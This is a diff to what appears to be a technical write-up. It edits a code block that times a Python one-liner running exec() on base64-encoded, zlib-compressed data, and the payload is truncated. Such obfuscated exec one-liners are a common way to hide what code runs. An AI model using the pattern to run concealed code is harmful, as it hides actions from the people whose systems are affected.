@@ -113,7 +113,7 @@ python -c 'import base64,sys,zlib;exec(zlib.decompress(base64.b64decode("eJx9U8F
 With this delay, the script completed in just under 4 and a half minutes. 
 
 ```
-$ time python -c 'import base64,sys,zlib;exec(zlib.decompress(base64.b64decode("eJx9U8F...
+user@clientlinux:~$ time python -c 'import base64,sys,zlib;exec(zlib.decompress(base64.b64decode("eJx9U8F...
 
 real    4m23.189s
 user    0m7.228s
